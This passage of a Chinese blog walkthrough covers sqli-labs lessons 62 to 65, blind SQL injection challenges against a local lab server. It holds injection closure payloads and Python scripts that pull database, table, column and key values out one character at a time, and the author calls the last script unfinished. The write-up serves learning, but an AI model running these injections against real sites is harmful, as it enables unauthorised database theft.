class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line">这里面还有盲注，坑啊， 这里就只测试注入点</span><br><span class="line">剩下的大家自己完成，这里发现sqlmap测试，不会导致页面重置，超过130次还可以执行</span><br><span class="line">获取注入点1&apos;) %23</span><br><span class="line">这里尝试写脚本试试</span><br><span class="line"></span><br><span class="line">先写个爆破数据库的 </span><br><span class="line">## 这里通过 &apos;) %23 可构成闭合</span><br><span class="line"></span><br><span class="line">from urllib import request</span><br><span class="line">from urllib import parse</span><br><span class="line">import  re</span><br><span class="line"></span><br><span class="line">url =&apos;http://192.168.64.135/Less-62/?id=&apos;</span><br><span class="line"></span><br><span class="line"># length</span><br><span class="line">num = 0</span><br><span class="line">for i in range(1,20):</span><br><span class="line">    num +=1</span><br><span class="line">    param = &apos;1 \&apos;) and (length(database())=&apos;+str(i)+&apos;) #&apos;</span><br><span class="line">    response = request.urlopen(url+parse.quote(param)).read().decode()</span><br><span class="line">    if (re.search(&quot;Angelina&quot;,response)):</span><br><span class="line">        print(&quot;length:&quot; + str(i))</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">database = &quot;&quot;</span><br><span class="line">for i in range(10):</span><br><span class="line">    a = b =64</span><br><span class="line">    while True:</span><br><span class="line">        num +=1</span><br><span class="line">        b = int(b/2)</span><br><span class="line">        param = &apos;1 \&apos;)  and (ascii(substr(database(),&apos;+str(i+1)+&apos;,1))&lt;&apos;+str(a)+&apos;) #&apos;</span><br><span class="line">        response = request.urlopen(url+parse.quote(param)).read().decode()</span><br><span class="line">        #print(url+parse.quote(param))</span><br><span class="line">        if (re.search(&quot;Angelina&quot;, response)):</span><br><span class="line">            a -=b</span><br><span class="line">        else:</span><br><span class="line">            param = &apos;1 \&apos;)  and (ascii(substr(database(),&apos; + str(i+1) + &apos;,1))=&apos; + str(a) + &apos;) #&apos;</span><br><span class="line">            response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">            #print(url + parse.quote(param))</span><br><span class="line">            if (re.search(&quot;Angelina&quot;, response)):</span><br><span class="line">                database +=chr(a)</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                a +=b</span><br><span class="line"></span><br><span class="line">print(database)</span><br><span class="line"></span><br><span class="line">之后爆破表 这一题写个完整的，之后就简略的写出注入点，</span><br><span class="line">爆破表，拿上面的修修改改</span><br><span class="line">通过检查，先确定表的长度，再去爆破</span><br><span class="line">爆破前记得重置，因为130次比较少</span><br><span class="line"># 查表的数量</span><br><span class="line">table_num = 0</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    param = &quot;1 &apos;) and (select count(*) from information_schema.tables where table_schema=database())=&quot;+str(table_num)+&quot; #&quot;</span><br><span class="line">    response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">    print(url+parse.quote(param))</span><br><span class="line">    if (re.search(&quot;Angelina&quot;,response)):</span><br><span class="line">        print(&quot;table_num:&quot;+str(table_num))</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        table_num += 1</span><br><span class="line">print(table_num)</span><br><span class="line"></span><br><span class="line"># # 确定表的长度</span><br><span class="line">table_length = 0</span><br><span class="line">while True:</span><br><span class="line">    param = &apos;1 \&apos;) and length(substr((select table_name from information_schema.tables where table_schema=database()),1))=&apos;+str(table_length)+&apos; #&apos;</span><br><span class="line">    response = request.urlopen(url+parse.quote(param)).read().decode()</span><br><span class="line">    print(url+parse.quote(param))</span><br><span class="line">    if (re.search(&quot;Angelina&quot;, response)):</span><br><span class="line">        print(&quot;table_num:&quot; + str(table_length))</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        table_length += 1</span><br><span class="line"></span><br><span class="line"># 获取表名</span><br><span class="line">table_name=&quot;&quot;</span><br><span class="line">for i in range(1,11):</span><br><span class="line">    a=b=64</span><br><span class="line">    while True:</span><br><span class="line">        b= int(b/2)</span><br><span class="line">        param = &apos;1 \&apos;)  and (ascii(substr((select table_name from information_schema.tables where table_schema=database()),&apos;+str(i)+&apos;,1))&lt;&apos;+str(a)+&apos;) #&apos;</span><br><span class="line">        response = request.urlopen(url+parse.quote(param)).read().decode()</span><br><span class="line">        print(url+parse.quote(param))</span><br><span class="line">        if (re.search(&quot;Angelina&quot;, response)):</span><br><span class="line">            a -=b</span><br><span class="line">        else:</span><br><span class="line">            param = &apos;1 \&apos;)  and (ascii(substr((select table_name from information_schema.tables where table_schema=database()),&apos;+str(i)+&apos;,1))=&apos; + str(a) + &apos;) #&apos;</span><br><span class="line">            response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">            print(url + parse.quote(param))</span><br><span class="line">            if (re.search(&quot;Angelina&quot;, response)):</span><br><span class="line">                table_name +=chr(a)</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                a +=b</span><br><span class="line"></span><br><span class="line">print(table_name)</span><br><span class="line"></span><br><span class="line">J8CLO25SRR</span><br><span class="line"></span><br><span class="line">最后查列，这里发现写的脚本比较费时，所以稍微修改一下</span><br><span class="line">column_name =&quot;&quot;</span><br><span class="line">for i in range(7,11):</span><br><span class="line">    a=b=64</span><br><span class="line">    while True:</span><br><span class="line">        b= int(b/2)</span><br><span class="line">        param = &apos;1 \&apos;)  and (ascii(substr((select table_name from information_schema.tables where table_name=&quot;&apos;+str(table_name)+&apos;&quot;),&apos;+str(i)+&apos;,1))&lt;&apos;+str(a)+&apos;) #&apos;</span><br><span class="line">        response = request.urlopen(url+parse.quote(param)).read().decode()</span><br><span class="line">        print(url+parse.quote(param))</span><br><span class="line">        if (re.search(&quot;Angelina&quot;, response)):</span><br><span class="line">            a -=b</span><br><span class="line">        else:</span><br><span class="line">            param = &apos;1 \&apos;)  and (ascii(substr((select table_name from information_schema.tables where table_name=&quot;&apos;+str(table_name)+&apos;&quot;),&apos;+str(i)+&apos;,1))=&apos; + str(a) + &apos;) #&apos;</span><br><span class="line">            response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">            print(url + parse.quote(param))</span><br><span class="line">            if (re.search(&quot;Angelina&quot;, response)):</span><br><span class="line">                column_name +=chr(a)</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                a +=b</span><br><span class="line">#HKIR</span><br><span class="line">print(column_name)</span><br><span class="line">column_name = &quot;secret_&quot;+column_name</span><br><span class="line"></span><br><span class="line"># 查 key</span><br><span class="line">for i in range(1,25):</span><br><span class="line">    a=b=64</span><br><span class="line">    while True:</span><br><span class="line">        b= int(b/2)</span><br><span class="line">        param = &apos;1 \&apos;)  and (ascii(substr((select &apos;+column_name+&apos; from &apos;+table_name+&apos;),&apos;+str(i)+&apos;,1))&lt;&apos;+str(a)+&apos;) #&apos;</span><br><span class="line">        response = request.urlopen(url+parse.quote(param)).read().decode()</span><br><span class="line">        print(url+parse.quote(param))</span><br><span class="line">        if (re.search(&quot;Angelina&quot;, response)):</span><br><span class="line">            a -=b</span><br><span class="line">        else:</span><br><span class="line">            param = &apos;1 \&apos;)  and (ascii(substr((select &apos;+column_name+&apos; from &apos;+table_name+&apos;)),&apos;+str(i)+&apos;,1))=&apos; + str(a) + &apos;) #&apos;</span><br><span class="line">            response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">            print(url + parse.quote(param))</span><br><span class="line">            if (re.search(&quot;Angelina&quot;, response)):</span><br><span class="line">                key +=chr(a)</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                a +=b</span><br><span class="line"># 这里脚本不满足复杂度，不能在130以内弄出来，作为参考，等我去翻翻算法，在回来改</span><br></pre></td></tr></table></figure>

<h2 id="Less-63-GET-challenge-Blind-130-queries-allowed-variation-2"><a href="#Less-63-GET-challenge-Blind-130-queries-allowed-variation-2" class="headerlink" title="Less-63 GET-challenge-Blind- 130 queries allowed -variation 2"></a>Less-63 GET-challenge-Blind- 130 queries allowed -variation 2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">和上一题类似</span><br><span class="line">这里就判断注入类型，和如何闭合</span><br><span class="line">1&apos; order by 4 %23</span><br><span class="line">通过判断 发现3 返回正常 4 错误</span><br><span class="line">所以之后的做法就和62 一样</span><br></pre></td></tr></table></figure>

<h2 id="Less-64-GET-challenge-Blind-130-queries-allowed-variation-3"><a href="#Less-64-GET-challenge-Blind-130-queries-allowed-variation-3" class="headerlink" title="Less-64 GET-challenge-Blind- 130 queries allowed -variation 3"></a>Less-64 GET-challenge-Blind- 130 queries allowed -variation 3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">测试了 &apos;  &quot; ) )) &apos;) &quot;) &apos;)) &quot;))</span><br><span class="line">1)) order by 3 %23 闭合</span><br></pre></td></tr></table></figure>

<h2 id="Less-65-GET-challenge-Blind-130-queries-allowed-variation-4"><a href="#Less-65-GET-challenge-Blind-130-queries-allowed-variation-4" class="headerlink" title="Less-65 GET-challenge-Blind- 130 queries allowed -variation 4"></a>Less-65 GET-challenge-Blind- 130 queries allowed -variation 4</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">和上一题一样，通过测试闭合</span><br><span class="line">发现 &quot;) 绕过 闭合 </span><br><span class="line">这里还有一种做法，将需要绕过的写入txt文件，之后通过burp去爆破，通过判断返回值也可以达到相同的效果</span><br></pre></td></tr></table></figure>

	
	</div>
	
	<div id="current-post-cover" data-scr="/img/cart_cover.jpg"></div>

	<!-- relate post, comment...-->
	<div class="investment-container">
		<div class="investment-header">
			<div class="investment-title-1">
				<div class="on">相关文章</div>
				<div>评论</div>
				<div>分享</div>
			</div>
			<div class="investment-title-2">	            
				
	<span>
		<a href="javascript: window.scrollTo(0, 0);">返回顶部</a>
		
			<a href="/2019/10/04/CTF/Buuoj/HCTF2018-warmup-writeup/" title="HCTF2018-warmup-writeup" rel="prev">
				&laquo;上一篇
			</a>
		
		
			<a href="/2019/10/04/CTF/实验吧/实验吧-web-后台登录/" title="后台登录" rel="next">
				下一篇&raquo;
			</a>
			
	</span>


      		
			</div>	
		</div>
		
		<div class="investment-content">
			<div class="investment-content-list">
				

<div class="relate-post">
	
		<ul>
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2019/10/05/web安全/XSS/XSS闯关小游戏/" title="">
											
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								十月 5日, 2019				
							</p>
							<p class="relate-post-content">
								xss 通关小游戏搭建环境下载 xss 通关小游戏
文件来自于：https://www.cnblogs.com/bmjoker/p/9446472.html

相信phpstudy
在官网安装最新版的phpstudy，通过360、火绒...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2019/10/05/web安全/XSS/XSS闯关小游戏/" title="">				
								
								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt=""/>
							</a>
						</div>
					</li>											
			
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2019/10/04/web安全/sql注入/DVWA 之SQL Injection/" title="DVWA 之SQL Injection">
								DVWA 之SQL Injection			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								十月 4日, 2019				
							</p>
							<p class="relate-post-content">
								SQL注入就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令


前言本文属于学习贴，我自己在学习的时候总结的，如有错误，请大家及时指出

dvwa v1.0.7

何为S...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2019/10/04/web安全/sql注入/DVWA 之SQL Injection/" title="DVWA 之SQL Injection">				
								
								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="DVWA 之SQL Injection"/>
							</a>
						</div>
					</li>											
			
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2019/10/04/web安全/shell/利用js文件反弹shell/" title="利用js文件反弹shell">
								利用js文件反弹shell			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								十月 4日, 2019				
							</p>
							<p class="relate-post-content">
								根据Jaky老哥的文章 复现一下反弹shell


前言本篇文章是按照大佬的文章复现本文只用于测试，请不要将其用于非法途径公众号： 洛米唯熊
环境
攻击： kaliip: 192.168.248.132
测试： windows 7 x...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2019/10/04/web安全/shell/利用js文件反弹shell/" title="利用js文件反弹shell">				
								
								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="利用js文件反弹shell"/>
							</a>
						</div>
					</li>											
			
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2019/10/04/web安全/远程文件包含/远程文件包含错误解决方法/" title="错误提示【URL file-access is disabled in the server configuration in】解决">
								错误提示【URL file-access is disabled in the server configuration in】解决			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								十月 4日, 2019				
							</p>
							<p class="relate-post-content">
								DVWA 初体验 远程文件包含错误，需要开启allow_url_include或者allow_url_ fopen


前言今天在做dvwa的file inclusion，发现远程 文件包含出错
解决方法可以看到提示的服务器配置中禁用...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2019/10/04/web安全/远程文件包含/远程文件包含错误解决方法/" title="错误提示【URL file-access is disabled in the server configuration in】解决">				
								
								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="错误提示【URL file-access is disabled in the server configuration in】解决"/>
							</a>
						</div>
					</li>											
			
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2019/10/04/CTF/实验吧/实验吧-web-后台登录/" title="后台登录">
								后台登录			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								十月 4日, 2019				
							</p>
							<p class="relate-post-content">
								实验吧web后台登录
burp抓包尝试爆破
一般呢，ctf题是不涉及爆破的，因为这样会导致服务器处理压力太大


可以看到这里当我们输入正确的密码后，会返回flag。
那么我们的重点就是获取密码了

寻找密码
尝试了几次弱密码，注入都...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2019/10/04/CTF/实验吧/实验吧-web-后台登录/" title="后台登录">				
								
								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="后台登录"/>
							</a>
						</div>
					</li>											
			
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2019/10/04/实用技巧/配置nat实现网络互通/" title="配置NAT实现网络互通">
								配置NAT实现网络互通			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								十月 4日, 2019				
							</p>
							<p class="relate-post-content">
								配置nat 实现主机互通


前言参加了拼客学院的第十期五天速成白帽子培训课，然后把一些常见的知识分享给大家
安装靶机下载的话网上都有直接去下就好了。
安装比较简单，这里推荐安装过程
Winxp安装教程
Win2003安装教程
配置N...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2019/10/04/实用技巧/配置nat实现网络互通/" title="配置NAT实现网络互通">				
								
								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="配置NAT实现网络互通"/>
							</a>
						</div>
					</li>											
			
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2019/10/04/实用技巧/CTF介绍/" title="CTF介绍">
								CTF介绍			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								十月 4日, 2019				
							</p>
							<p class="relate-post-content">
								刚开始接触CTF,对于misc，reverse等等都傻傻分不清，所以专门去查了下这些名词，给没有接触CTF的童鞋一点入门基础.


前言刚开始接触CTF,对于misc，reverse等等都傻傻分不清，所以专门去查了下这些名词，给没有接...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2019/10/04/实用技巧/CTF介绍/" title="CTF介绍">				
								
								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="CTF介绍"/>
							</a>
						</div>
					</li>											
			
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2019/10/04/实用技巧/DVWA 如何查看登录密码并修改/" title="DVWA 查看默认密码">
								DVWA 查看默认密码			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								十月 4日, 2019				
							</p>
							<p class="relate-post-content">
								如何数据库查看dvwa的密码，跳过密码验证


前言今天登录dvwa的时候发现密码错误，尝试了我自己常设置的密码后都没有结果，就决定去数据库查看dvwa的密码。话不多说，直接开始操作
dvwa默认密码如果小伙伴们只需要dvwa的默认密...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2019/10/04/实用技巧/DVWA 如何查看登录密码并修改/" title="DVWA 查看默认密码">				
								
								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="DVWA 查看默认密码"/>
							</a>
						</div>
					</li>											
			
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2019/10/04/实用技巧/Markdown语法介绍/" title="Markdown编辑器语法">
								Markdown编辑器语法			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								十月 4日, 2019				
							</p>
							<p class="relate-post-content">
								Markdown是一种轻量级标记语言,它允许人们“使用易读易写的纯文本格式编写文档，然后转换有效的XHTML或者HTML文档”，这种语言吸收了很多电子邮件中已有的纯文本标记的特性。


前言为什么要写博客
先谈论一个话外题，为什么选择...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2019/10/04/实用技巧/Markdown语法介绍/" title="Markdown编辑器语法">				
								
								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="Markdown编辑器语法"/>
							</a>
						</div>
					</li>											
			
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2019/10/04/实用技巧/OWASP TOP 10/" title="OWASP Top 10简要介绍">
								OWASP Top 10简要介绍			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								十月 4日, 2019				
							</p>
							<p class="relate-post-content">
								为了加深对owasp top 10 的印象 ，写一篇作为记录


前言
最近在找实习，看到招聘全是要求熟悉OWASP Top 10,为了加深印象所以写一个博客记录一下 ,也希望可以为有相同需求的小伙伴提供好的资料,之后我会陆续更新相关...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2019/10/04/实用技巧/OWASP TOP 10/" title="OWASP Top 10简要介绍">				
								
								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="OWASP Top 10简要介绍"/>
							</a>
						</div>
					</li>											
			
			
		</ul>
	
</div>	
			</div>
			<div class="investment-content-list">
				<div class="layout-comment">

	

		

			<!-- I don't know !!!-->
			<div>Please check the comment setting in config.yml of hexo-theme-Annie!</div>
			
		
		
	

</div>
			</div>
			<div class="investment-content-list">
				<div class="layout-share">
	
	

		
			
			<!-- socialShare share -->
			<div class="social-share"></div>

<!--  css & js -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
<script async src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
			
		
		
	
</div>


			</div>
		</div>	
	</div>
	</div>
</div>



	<!-- leancloud -->
	<!--
	时间：2018-11-27
	描述：
		文章访问量：visitors
		文章喜欢量：likes	
		文章排行榜：topNPost
		其他得说明：
			01-Cookie相关的函数 
				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
			02-visitors相关的函数 
				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
			03-topNPost相关的函数
				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
			04-likes相关的函数，
				参考了01 & 02进行简单的设计与实现
-->



	<script>
		var appid = 'nvd69LH66AqtfBomoagKzq9T-gzGzoHsz',
            appkey = 'tXeQfaUF0IR9Ir5vjSU0DnjT';	  
        AnnieLeancloud(appid, appkey);         
	</script>
    

	


<!-- show math formula -->



	 
	<script src="/plugin/clipboard/clipboard.js"></script>
	<script>
		// Copy code !
	    function codePreprocessing() {
	        $("#article-content .highlight").each(function() {

	            $(this).wrap('<div id="post-code"></div>');

	        })

	        $("#article-content #post-code").each(function() {

	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');

	        })

	        $("#article-content .copy-nav").each(function() {
	            var temp = $(this).next().attr('class'),
	                language = ((temp.length > 9) && (temp != null)) ? temp.substr(10) : "none"; //why 9? Need to check language?

	            $(this).find('.code-language').text(language);

	            $(this).append('<span class="copy-btn"><i class="fa fa-copy" aria-hidden="true"></i></span>');

	        });
	    }

		function codeCopy() {
		    $('#article-content #post-code').each(function(i) {
		        var codeCopyId = 'codeCopy-' + i;

		        var codeNode = $(this).find('.code'),
		            copyButton = $(this).find('.copy-btn');

		        codeNode.attr('id', codeCopyId);
		        copyButton.attr('data-clipboard-target-id', codeCopyId);
		    })

		    
			var clipboard = new ClipboardJS('.copy-btn', {
					target: function(trigger) {
						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
					}
		      	});

			//pure js
			function showTooltip(elem, msg) {		   
				elem.setAttribute('aria-label', msg);
				elem.setAttribute('class', 'copy-btn copy-status');
				setTimeout(function() {
					elem.setAttribute('class', 'copy-btn');
				}, 2000);
			}

			clipboard.on('success', function(e) {
			    e.clearSelection();
			    console.info('Action:', e.action);		   
			    console.info('Trigger:', e.trigger);
			    showTooltip(e.trigger, 'Copied!');
			    
			});
			clipboard.on('error', function(e) {
			    console.error('Action:', e.action);
			    console.error('Trigger:', e.trigger);
			});
		

		}

		if ($('.layout-post').length) {
		    codePreprocessing();
		    codeCopy();
		} 
	</script>





<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
<script src="/plugin/fancybox/jquery.fancybox.js"></script>

<script type="text/javascript">
	var titleID = $('.article-title a'),
		imageID = $('.article-content img'),
		videoID = $('.article-content video');

	var postTitle = titleID.text() ? titleID.text() : "No post title!";

	imageID.each(function() {
		var imgPath = $(this).attr('src'),
			imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";

		//给每个匹配的<img>元素打包, 即添加父元素<a>
		$(this).wrap('<a data-fancybox="gallery" data-caption=" 《 ' + postTitle + ' 》 ' + imgTitle + ' "  href=" ' + imgPath + ' "> </a>');
	});

	videoID.each(function() {
		var videoPath = $(this).attr('src');

		//给每个匹配的<img>元素打包, 即添加父元素<a>
		$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
	});
	//TODO：支持html5 video

	if($('#layout-post').length) {
		$('[data-fancybox="gallery"]').fancybox({
			loop: true,
			buttons: [
				"zoom",
				"share",
				"slideShow",
				"fullScreen",
				//"download",
				"thumbs",
				"close"
			],
			protect: false
		});
	}
</script>
		</main>

		<!--footer-->
		<footer>
	<div class="social">
		<ul>
	
		<li>
			<a href="http://github.com/" target="_blank">
				<i class="fa fa-github"></i>
			</a>
		</li>
	
		<li>
			<a href="http://github.com/" target="_blank">
				<i class="fa fa-weibo"></i>
			</a>
		</li>
	
		<li>
			<a href="http://github.com/" target="_blank">
				<i class="fa fa-pinterest"></i>
			</a>
		</li>
	
		<li>
			<a href="http://github.com/" target="_blank">
				<i class="fa fa-instagram"></i>
			</a>
		</li>
	
		<li>
			<a href="http://github.com/" target="_blank">
				<i class="fa fa-twitter"></i>
			</a>
		</li>
	
		<li>
			<a href="/atom.xml" target="_blank">
				<i class="fa fa-rss"></i>
			</a>
		</li>
			
</ul>

	</div>
		
	<div class="copyright">
		<p>
			 
				&copy;2019, content by ST0new. All Rights Reserved.
			
			
			

	<!-- busuanzi -->
	<!-- busuanzi -->

		
	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
	

		<span id="busuanzi_container_page_pv">
	  		本文总阅读量<span id="busuanzi_value_page_pv"></span>次
		</span>

	




		</p>
		<p>
			<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
		</p>
	</div>		
</footer>
		
	<!-- set '1' to show motto in all pages! -->

	<script src="/plugin/motto/motto.js"></script>
	
	<script type="text/javascript">
		$(".motto").html( getMingYanContent() );
	</script>	




	<!--
	时间：2018-10-3
	描述：
		插件名称：hexo-generator-search-zip
		插件来源: https://github.com/SuperKieran/hexo-generator-search-zip
		代码参考：https://github.com/SuperKieran/TKL/blob/master/layout/_partial/search.ejs(Include: js & css)	
-->
<div class="popup search-popup local-search-popup" >
	<div class="local-search-container">
		<span class="popup-btn-close">
      		ESC
   		</span>
		<div class="local-search-header">
			<div class="input-prompt">				
			</div>
			<input autocomplete="off" placeholder="Search..." type="text" id="local-search-input">
		</div>
		<div class="local-search-body">
			<div id="local-search-output"></div>
		</div>
		<div class="local-search-footer">
			<div class="topN-post">				
				

   
	<div id="topN">
		<div class="topN-title" data-title= "热门文章"></div> 
	</div>
	
    <script>
        var appid = 'nvd69LH66AqtfBomoagKzq9T-gzGzoHsz',
            appkey = 'tXeQfaUF0IR9Ir5vjSU0DnjT',
            limitCount = 10;
        if( $('#topN').length ){
            AV.initialize(appid, appkey);
            var Counter = AV.Object.extend("Counter");  
            topNPost(Counter, limitCount);
        }
    </script>
   
								
			</div>
		</div>
	</div>
</div>

<script src="/plugin/search/ziploader.js"></script>
<script src="/plugin/search/search.js"></script>

<script type="text/javascript">
	var search_path = 'search.json',
		zip_Path = '/search.zip',
		version_Path = '/searchVersion.txt',
		input_Trigger = 'auto',
		top_N = '2';

	themeLocalSearch({
		search_path, 
		zip_Path, 
		version_Path, 
		input_Trigger, 
		top_N
	});
</script>


<!-- love effect -->

	<script src="/plugin/love/love.js"></script>


<!-- back to top -->

	
	<div id="totop">
  		<a href="javascript:;"  name="TOTOP" class="fa fa-arrow-up" ></a>
	</div>




<!-- site analysis -->


	<!-- site-analysis -->
	
	
	
	
	
 

<script src="/plugin/vibrant/vibrant.js"></script>
<script src="/plugin/chinese/chinese.js"></script>
<script src="/plugin/imgLazyLoader/yall.min.js"></script>
<script src="/plugin/imgResize/jquery.resizeimagetoparent.min.js"></script>
<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
<script src="/js/resizediv.js"></script>
<script src="/js/main.js"></script>
	</body>	
</html>